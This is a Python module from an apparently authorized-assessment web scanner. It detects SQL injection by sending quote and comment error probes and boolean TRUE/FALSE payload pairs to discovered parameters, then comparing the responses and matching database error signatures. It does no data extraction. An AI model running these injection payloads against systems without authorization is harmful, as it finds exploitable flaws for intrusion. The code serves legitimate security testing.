#!/usr/bin/env python3
"""HT Forge 1.7 - SQL injection detector.

Detection-only, evidence-oriented checks for authorized assessments.
No data extraction, UNION dumping, credential harvesting, or time-delay
payloads are used. The detector combines the central PayloadCollection with
stable baselines, error signatures, boolean differential analysis and bounded
coverage across discovered parameters.
"""
import re
import time
from difflib import SequenceMatcher
from typing import Dict, Any, Tuple, Iterable
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
from core.context import Context
from core.payloads import PayloadCollection

SQL_ERRORS = [
    r"SQL syntax.*MySQL", r"You have an error in your SQL syntax", r"Warning.*mysql",
    r"mysqli?[_ ]", r"MariaDB", r"PostgreSQL.*(?:ERROR|error)", r"Npgsql", r"pg_query",
    r"unterminated quoted string", r"SQL Server.*(?:Driver|error)", r"SqlException",
    r"System\.Data\.(?:SqlClient|OleDb)", r"ODBC SQL Server", r"Microsoft OLE DB Provider",
    r"Microsoft Access Driver", r"JET Database", r"ORA-\d{5}", r"Oracle.*(?:error|driver)",
    r"SQLite.*(?:error|exception|syntax)", r"unrecognized token", r"quoted string not properly terminated",
    r"JDBC.*(?:SQLException|SQL)", r"Hibernate.*(?:SQL|exception)", r"SQLSTATE(?:\[|\s)",
    r"org\.springframework.*(?:SQLException|BadSqlGrammar|JDBC)",
    r"java\.sql\.(?:SQLException|SQLSyntaxErrorException)",
    r"Microsoft SQL Native Client", r"DB2 SQL error", r"Sybase.*(?:error|message)",
]
SQL_ERROR_REGEX = [re.compile(x, re.I | re.S) for x in SQL_ERRORS]

LOW_VALUE_PARAMS = {
    'ver', 'version', 'v', 'rev', 'revision', 'cache', 'cachebust', 'cb',
    'nonce', 'timestamp', 'ts', 'utm_source', 'utm_medium', 'utm_campaign',
    'utm_term', 'utm_content', 'fbclid', 'gclid', 'amp', 'format', 'output',
}

# PayloadCollection is the single central source of common SQLi probes.
# Forge adds a few context/comment variants here to improve coverage without
# turning the detector into an exploitation/data-extraction module.
ERROR_PROBES = tuple(dict.fromkeys(PayloadCollection.SQLI_ERROR + (
    "'-- -", '"-- -', "')-- -", '")-- -', "' #", '" #',
)))

BOOLEAN_NUM = tuple(dict.fromkeys(PayloadCollection.SQLI_BOOLEAN_NUM + (
    ("{v} AND 1=1-- -", "{v} AND 1=2-- -"),
    ("{v} OR 1=1-- -", "{v} OR 1=2-- -"),
    ("{v} AND 2=2-- -", "{v} AND 2=3-- -"),
    ("{v} AND 1=1#", "{v} AND 1=2#"),
)))

BOOLEAN_TEXT = tuple(dict.fromkeys(PayloadCollection.SQLI_BOOLEAN_TEXT + (
    ("{v}' AND '1'='1'-- -", "{v}' AND '1'='2'-- -"),
    ("{v}' OR '1'='1'-- -", "{v}' OR '1'='2'-- -"),
    ("{v}' AND 'a'='a'-- -", "{v}' AND 'a'='b'-- -"),
    ("{v}' OR 'a'='a'-- -", "{v}' OR 'a'='b'-- -"),
    ('{v}" AND "1"="1"-- -', '{v}" AND "1"="2"-- -'),
)))

# Hard bounds keep SQLi from consuming the whole scan on slow/action endpoints.
# PayloadCollection remains the source of payloads; these limits only select a
# small, high-signal detection subset before expanding coverage.
MAX_ERROR_PROBES = 20
MAX_BOOLEAN_PAIRS = 12
DEFAULT_SQLI_MAX_PARAMS = 30
DEFAULT_SQLI_BUDGET = 240
DEFAULT_SQLI_REQUEST_TIMEOUT = 4


def _set_query_param(url: str, param: str, value: str) -> str:
    p = urlsplit(str(url))
    pairs = parse_qsl(p.query, keep_blank_values=True)
    out, replaced = [], False
    for k, v in pairs:
        if k == param:
            if not replaced:
                out.append((k, value))
                replaced = True
        else:
            out.append((k, v))
    if not replaced:
        out.append((param, value))
    return urlunsplit((p.scheme, p.netloc, p.path, urlencode(out, doseq=True), p.fragment))


def _request(ctx: Context, info: Dict[str, Any], value: str):
    """Issue one reproducible request, preserving the original form/URL shape."""
    method = str(info.get('method', 'GET')).upper()
    url = str(info.get('url', ctx.target))
    param = str(info.get('param', ''))
    timeout = float(ctx.config.get('sqli_request_timeout', DEFAULT_SQLI_REQUEST_TIMEOUT))
    if method == 'POST':
        data = dict(info.get('form_data') or {})
        data[param] = value
        return ctx.req(
            'POST', url, data=data,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Connection': 'close',
            },
            timeout=timeout,
        )
    return ctx.req(
        'GET', _set_query_param(url, param, value),
        headers={'Connection': 'close'},
        timeout=timeout,
    )


def _text(resp) -> str:
    return getattr(resp, 'text', '') or ''


def _status(resp) -> int:
    try:
        return int(getattr(resp, 'status_code', 0) or 0)
    except Exception:
        return 0


def _location(resp) -> str:
    headers = getattr(resp, 'headers', {}) or {}
    return str(headers.get('Location', '') or '')


def _normalise(text: str) -> str:
    """Reduce volatile response material before differential comparison."""
    text = re.sub(r'\b\d{10,}\b', '<N>', text)
    text = re.sub(
        r'(?i)(nonce|token|csrf|request[_-]?id)\s*[=:]\s*["\']?[^\s"\'<>]+',
        r'\1=<VAR>', text,
    )
    text = re.sub(r'(?i)(set-cookie:\s*[^;\r\n]+)', 'set-cookie:<VAR>', text)
    text = re.sub(r'\s+', ' ', text)
    return text[:200000]


def _similar(a: str, b: str) -> float:
    a, b = _normalise(a), _normalise(b)
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    return SequenceMatcher(None, a, b).ratio()


def _token_similarity(a: str, b: str) -> float:
    """Compare visible content while ignoring ordering/noise changes."""
    ta = set(re.findall(r"[A-Za-z0-9_./:-]{3,}", _normalise(a).lower()))
    tb = set(re.findall(r"[A-Za-z0-9_./:-]{3,}", _normalise(b).lower()))
    if not ta and not tb:
        return 1.0
    if not ta or not tb:
        return 0.0
    return len(ta & tb) / max(1, len(ta | tb))


def _is_numeric(value: str) -> bool:
    return bool(re.fullmatch(r'-?\d+(?:\.\d+)?', str(value).strip()))


def _baseline_value(info: Dict[str, Any], param: str) -> str:
    for key in ('baseline_value', 'value'):
        value = info.get(key)
        if value is not None and str(value) != '':
            return str(value)
    try:
        for key, value in parse_qsl(urlsplit(str(info.get('url', ''))).query, keep_blank_values=True):
            if key == param:
                return value
    except Exception:
        pass
    return '1' if param.lower() in {'id', 'uid', 'page', 'post', 'item', 'cat', 'category'} else 'test'


def _param_priority(info: Dict[str, Any]) -> int:
    name = str(info.get('param') or '').strip().lower()
    value = str(info.get('baseline_value', info.get('value', '')) or '')
    url = str(info.get('url', '') or '').lower()
    score = 0
    if name in {
        'id', 'item', 'uid', 'user', 'userid', 'user_id', 'account', 'account_id',
        'cat', 'category', 'product', 'product_id', 'page', 'page_id', 'post', 'post_id',
        'article', 'article_id', 'search', 'q', 'query', 'keyword', 'term', 'name',
        'title', 'path', 'file', 'filename', 'dir', 'directory', 'order', 'sort',
        'filter', 'view', 'action', 'mode', 'ref', 'redirect', 'return', 'url',
    }:
        score += 100
    if _is_numeric(value):
        score += 35
    if str(info.get('method', 'GET')).upper() == 'POST':
        score += 20
    if '?' in url:
        score += 5
    if value:
        score += 3
    # Acciones de envío (feedback/contacto/suscripción) rara vez son superficie de
    # inyección SQL y suelen expirar: se prueban al final para no colgar el módulo.
    if any(seg in url for seg in ('sendfeedback', 'feedback', 'contact', 'subscribe', 'newsletter', 'comment', 'postcomment', 'review')):
        score -= 60
    if name in LOW_VALUE_PARAMS:
        score -= 40
    return score


def _unique_params(params: Iterable[Dict[str, Any]]) -> list:
    out, seen = [], set()
    for info in params:
        if not isinstance(info, dict):
            continue
        key = (str(info.get('url', '')), str(info.get('param', '')), str(info.get('method', 'GET')).upper())
        if key[1] and key not in seen:
            seen.add(key)
            out.append(info)
    return out


def _finding(ctx: Context, info: Dict[str, Any], param: str, title: str,
             detail: str, confidence: float, evidence: Dict[str, Any]):
    f = {
        'type': 'sqli', 'severity': 'high', 'title': title, 'detail': detail,
        'confidence': confidence, 'evidence': evidence,
        'url': evidence.get('url') or info.get('url', ctx.target),
        'parameter': param,
    }
    ctx.finding(f)
    ctx.log('ok', f'SQLi detectado en {param}')
    return f


def _differential(base, true_resp, false_resp) -> Tuple[bool, Dict[str, Any]]:
    bt, tt, ft = _text(base), _text(true_resp), _text(false_resp)
    bs, ts, fs = _status(base), _status(true_resp), _status(false_resp)
    tb = _similar(bt, tt)
    fb = _similar(bt, ft)
    tf = _similar(tt, ft)
    tb_tok = _token_similarity(bt, tt)
    fb_tok = _token_similarity(bt, ft)
    tf_tok = _token_similarity(tt, ft)
    true_norm, false_norm = _normalise(tt), _normalise(ft)
    base_norm = _normalise(bt)
    length_gap = abs(len(true_norm) - len(false_norm))
    max_len = max(len(true_norm), len(false_norm), 1)
    length_ratio = length_gap / max_len
    status_signal = ts != fs
    base_gap = tb - fb
    token_gap = tb_tok - fb_tok
    redirect_signal = ts in {301, 302, 303, 307, 308} and ts != bs and ts != fs
    true_loc, false_loc, base_loc = _location(true_resp), _location(false_resp), _location(base)
    location_signal = bool(true_loc and true_loc != false_loc and true_loc != base_loc)

    # A strong SQLi differential is asymmetric: TRUE stays near baseline while
    # FALSE moves away, or TRUE/FALSE produce clearly distinct application states.
    # Two complementary classifiers are used because real web pages often
    # contain dynamic fragments that make a raw body ratio too strict.
    asymmetric = (tb >= 0.64 and base_gap >= 0.10 and tf <= 0.94)
    token_asymmetric = (tb_tok >= 0.62 and token_gap >= 0.10 and tf_tok <= 0.94)
    strong_length = (tb >= 0.66 and length_ratio >= 0.12 and (base_gap >= 0.06 or token_gap >= 0.06))
    status_based = (tb >= 0.62 and base_gap >= 0.06 and status_signal and tf <= 0.97)
    direct_split = (tf <= 0.60 or tf_tok <= 0.55) and max(abs(tb - fb), abs(tb_tok - fb_tok)) >= 0.08

    # A boolean differential must have either two independent body signals or
    # one body signal plus a transport/state signal. This reduces noisy-page FP.
    body_signals = sum(bool(x) for x in (asymmetric, token_asymmetric, strong_length, direct_split))
    strong = (body_signals >= 2 or status_based or redirect_signal or location_signal)

    metrics = {
        'baseline_status': bs, 'true_status': ts, 'false_status': fs,
        'baseline_length': len(base_norm),
        'true_length': len(true_norm), 'false_length': len(false_norm),
        'true_baseline_similarity': round(tb, 4),
        'false_baseline_similarity': round(fb, 4),
        'true_false_similarity': round(tf, 4),
        'true_baseline_token_similarity': round(tb_tok, 4),
        'false_baseline_token_similarity': round(fb_tok, 4),
        'true_false_token_similarity': round(tf_tok, 4),
        'baseline_gap': round(base_gap, 4),
        'token_gap': round(token_gap, 4),
        'length_gap': length_gap,
        'length_ratio': round(length_ratio, 4),
        'status_gap': status_signal,
        'baseline_location': base_loc,
        'true_location': true_loc,
        'false_location': false_loc,
        'signals': {
            'asymmetric': asymmetric,
            'strong_length': strong_length,
            'status_based': status_based,
            'redirect': redirect_signal,
            'location': location_signal,
            'direct_split': direct_split,
        },
    }
    return strong, metrics


def _build_pairs(original: str) -> list:
    """Build bounded boolean pairs for both numeric and quoted contexts."""
    pairs = []
    if _is_numeric(original):
        pairs.extend((a.format(v=original), b.format(v=original)) for a, b in BOOLEAN_NUM)
        pairs.extend((a.format(v=original), b.format(v=original)) for a, b in BOOLEAN_TEXT)
    else:
        pairs.extend((a.format(v=original), b.format(v=original)) for a, b in BOOLEAN_TEXT)
        # A small numeric-context fallback catches parameters that are stored as
        # numbers even when the crawler originally observed a textual value.
        pairs.extend((a.format(v=original), b.format(v=original)) for a, b in BOOLEAN_NUM[:3])
    seen = set()
    out = []
    for pair in pairs:
        if pair not in seen:
            seen.add(pair)
            out.append(pair)
    return out


def _deadline(ctx: Context) -> float:
    budget = max(15, float(ctx.config.get('sqli_time_budget', DEFAULT_SQLI_BUDGET)))
    return time.monotonic() + budget


def _within_budget(deadline: float) -> bool:
    return time.monotonic() < deadline


def _confirm_differential(ctx: Context, info: Dict[str, Any], original: str, base, pair, deadline: float):
    """Replay a positive TRUE/FALSE pair once to distinguish stable behavior from noise."""
    if not _within_budget(deadline) or ctx.stopped:
        return False, None
    tr = _request(ctx, info, pair[0])
    if not _within_budget(deadline) or ctx.stopped:
        return False, None
    fr = _request(ctx, info, pair[1])
    detected, metrics = _differential(base, tr, fr)
    return detected, metrics


def run(ctx: Context) -> Dict:
    target = ctx.target
    params = _unique_params(ctx.get('discovered_params', []) or [
        {'url': target, 'param': 'id', 'method': 'GET', 'baseline_value': '1'},
        {'url': target, 'param': 'q', 'method': 'GET', 'baseline_value': 'test'},
    ])

    # 1.5 raises coverage while retaining a hard upper bound. A caller can
    # explicitly lower it for slower targets.
    max_params = max(1, int(ctx.config.get('sqli_max_params', DEFAULT_SQLI_MAX_PARAMS)))
    deadline = _deadline(ctx)
    ordered = sorted(params, key=_param_priority, reverse=True)
    selected = ordered[:max_params]
    ctx.log('info', f'Iniciando SQLi: {len(selected)} parámetros (cobertura adaptativa)')

    errors = 0
    tested = 0
    findings_before = len(ctx.get_report().get('findings', []))
    # Parámetros cuyo endpoint es una acción de envío (feedback/contacto/suscripción)
    # y que ya dieron timeout: no reintentar en la fase booleana para no colgar el módulo.
    skip_boolean = set()

    budget_exhausted = False
    for index, info in enumerate(selected, 1):
        if ctx.stopped:
            break
        if not _within_budget(deadline):
            budget_exhausted = True
            ctx.log('info', 'SQLi: presupuesto de tiempo agotado; cierre limpio del módulo')
            break
        param = str(info.get('param') or '')
        if not param:
            continue
        # Saltar acciones de envío que ya fallaron por timeout (sendFeedback, contact, etc.)
        if param in skip_boolean:
            continue
        tested += 1
        try:
            original = _baseline_value(info, param)
            base = _request(ctx, info, original)
            base_text = _text(base)
            base_status = _status(base)

            # Two baselines reduce false positives caused by dynamic pages.
            baseline_stable = True
            try:
                base2 = _request(ctx, info, original)
                baseline_stable = (_status(base2) == base_status and
                                   _similar(base_text, _text(base2)) >= 0.90)
            except (TimeoutError, ConnectionError, RuntimeError):
                # One good baseline is still useful; probe stage will determine
                # whether the parameter is actually testable.
                baseline_stable = False

            error_hit = False
            for payload in ERROR_PROBES[:MAX_ERROR_PROBES]:
                if ctx.stopped or not _within_budget(deadline):
                    break
                resp = _request(ctx, info, payload)
                text = _text(resp)
                match = next((r for r in SQL_ERROR_REGEX if r.search(text)), None)
                if match:
                    # Replay the exact error probe once. A single transient error page
                    # is not enough to call SQLi confirmed.
                    if not _within_budget(deadline):
                        break
                    confirm = _request(ctx, info, payload)
                    confirm_text = _text(confirm)
                    confirmed = bool(match.search(confirm_text))
                    if not confirmed:
                        continue
                    method = str(info.get('method', 'GET')).upper()
                    probe_url = (_set_query_param(info.get('url', target), param, payload)
                                 if method == 'GET' else info.get('url', target))
                    _finding(
                        ctx, info, param, 'SQL Injection',
                        f'Firma de error SQL reproducible al alterar "{param}".', 0.99,
                        {'method': method, 'url': probe_url, 'parameter': param,
                         'payload': payload, 'response_status': _status(resp),
                         'confirmation_status': _status(confirm),
                         'response_snippet': text[:1200], 'confirmation_snippet': confirm_text[:1200],
                         'signature': match.pattern, 'baseline_status': base_status,
                         'baseline_stable': baseline_stable, 'reproduced': True},
                    )
                    error_hit = True
                    break

            if not error_hit and not ctx.stopped:
                pairs = _build_pairs(original)[:MAX_BOOLEAN_PAIRS]
                positive_pairs = 0
                best_metrics = None
                best_pair = None

                for true_payload, false_payload in pairs:
                    if ctx.stopped or not _within_budget(deadline):
                        break
                    tr = _request(ctx, info, true_payload)
                    if not _within_budget(deadline):
                        break
                    fr = _request(ctx, info, false_payload)
                    detected, metrics = _differential(base, tr, fr)
                    if detected:
                        # Replay the winning pair immediately. This is the key FP
                        # guard for dynamic pages and caches.
                        confirmed, confirm_metrics = _confirm_differential(
                            ctx, info, original, base, (true_payload, false_payload), deadline)
                        if confirmed:
                            positive_pairs += 1
                            best_metrics = confirm_metrics or metrics
                            best_pair = (true_payload, false_payload)
                            best_metrics['initial_metrics'] = metrics
                            # One replay-confirmed pair is sufficient. A second
                            # independent pair is still attempted when cheap.
                            if positive_pairs >= 2:
                                break

                if best_metrics is not None and best_pair is not None:
                    method = str(info.get('method', 'GET')).upper()
                    true_payload, false_payload = best_pair
                    probe_url = (_set_query_param(info.get('url', target), param, true_payload)
                                 if method == 'GET' else info.get('url', target))
                    confidence = 0.98 if positive_pairs >= 2 else 0.96
                    best_metrics.update({
                        'method': method, 'url': probe_url, 'parameter': param,
                        'true_payload': true_payload, 'false_payload': false_payload,
                        'positive_pairs': positive_pairs,
                        'baseline_stable': baseline_stable,
                        'replayed_confirmation': True,
                    })
                    _finding(
                        ctx, info, param, 'Possible SQL Injection',
                        f'Diferencia booleana reproducible entre condiciones TRUE/FALSE en "{param}".',
                        confidence, best_metrics,
                    )

        except (TimeoutError, ConnectionError, RuntimeError) as exc:
            errors += 1
            # Un POST de acción (sendFeedback, contact, etc.) que expira no es
            # superficie de inyección: lo excluimos de la fase booleana para no
            # colgar el módulo ni agotar el module_timeout del engine.
            if isinstance(exc, TimeoutError):
                skip_boolean.add(param)
            if not ctx.stopped:
                ctx.log('warn', f'SQLi submit: Timeout en {str(info.get("method","GET")).upper()} {info.get("url")} (param {param}) — excluido de fase booleana')
        except Exception as exc:
            errors += 1
            if not ctx.stopped:
                ctx.log('warn', f'SQLi {param}: {type(exc).__name__}: {exc}')

        ctx.progress(index, len(selected), f'SQLi: {index}/{len(selected)} parámetros')

    findings_after = len(ctx.get_report().get('findings', []))
    stats = {
        'selected_parameters': len(selected),
        'tested_parameters': tested,
        'transport_or_probe_errors': errors,
        'findings': findings_after - findings_before,
        'time_budget_seconds': max(15, float(ctx.config.get('sqli_time_budget', DEFAULT_SQLI_BUDGET))),
        'budget_exhausted': budget_exhausted,
        'probe_limits': {'error_probes': MAX_ERROR_PROBES, 'boolean_pairs': MAX_BOOLEAN_PAIRS},
    }
    setter = getattr(ctx, 'set', None)
    if callable(setter):
        setter('sqli_stats', stats)
    if errors:
        ctx.log('warn', f'SQLi finalizado: {tested} parámetros probados, {errors} con errores de transporte/probe')
    else:
        ctx.log('info', f'SQLi finalizado: {tested} parámetros probados, sin errores de transporte')

    return {'findings': ctx.get_report().get('findings', [])}


__version__ = '1.8'
__author__ = 'HT Team'
PHASE = 'attack'
REQUIRES = ['crawler']
